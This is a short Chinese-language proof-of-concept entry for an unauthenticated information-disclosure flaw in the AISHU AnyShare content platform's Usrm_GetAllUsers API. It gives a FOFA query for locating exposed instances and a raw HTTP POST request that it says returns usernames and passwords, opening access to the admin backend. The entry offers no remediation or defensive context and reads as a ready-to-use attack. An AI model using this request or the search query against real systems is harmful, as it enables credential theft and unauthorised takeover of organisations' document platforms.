# 爱数AnyShare智能内容管理平台Usrm_GetAllUsers信息泄露漏洞

爱数 AnyShare智能内容管理平台 Usrm_GetAllUsers 接口存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。可登录后台，使系统处于极不安全状态。

## fofa

```javascript
app="AISHU-AnyShare"
```

## poc

```javascript
OST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

[1,100]
```

![image-20241108205715836](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411082057919.png)